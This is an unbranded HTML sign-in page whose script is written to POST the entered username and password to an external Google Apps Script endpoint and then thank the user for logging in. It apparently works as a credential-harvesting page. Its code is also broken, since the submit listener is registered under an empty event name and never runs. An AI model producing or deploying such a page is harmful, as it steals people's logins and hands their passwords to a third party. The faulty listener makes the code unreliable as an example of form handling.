<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Sign In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        #login-container {
            background-color: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 300px;
        }

        h2 {
            text-align: center;
            color: #333;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
        }

        input {
            width: 100%;
            padding: 8px;
            margin-bottom: 16px;
            box-sizing: border-box;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #4caf50;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }

        button:hover {
            background-color: #45a049;
        }
    </style>
</head>
<body>

<div id="login-container">
    <h2> Sign In</h2>
    <form id="login-form" onsubmit="return validateForm()" name="Sign">
        <label for="username">Username:</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Password:</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Sign In</button>
    </form>
</div>

<script>
    function validateForm() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;

        if (username === "" || password === "") {
            alert("Please enter both username and password");
            return false;
        }
        return true;
    }
    const scriptURL =
'https://script.google.com/macros/s/AKfycbyipILV6snaVQae-7uL1n7CDghRMzUE87mhQ0X6oIh22l3cWaPt6HV47urF7SO3EcE2/exec'
const form = document.forms['Sign']

form.addEventListener('', e => {
e.preventDefault()
fetch(scriptURL, {
        method: 'POST',
        body: new FormData(form)
    })
    .then(response => alert(
        "Thanks for Logining In!!!"))
    .catch(error => console.error('Error!', error.message))
})
</script>

</body>
</html>
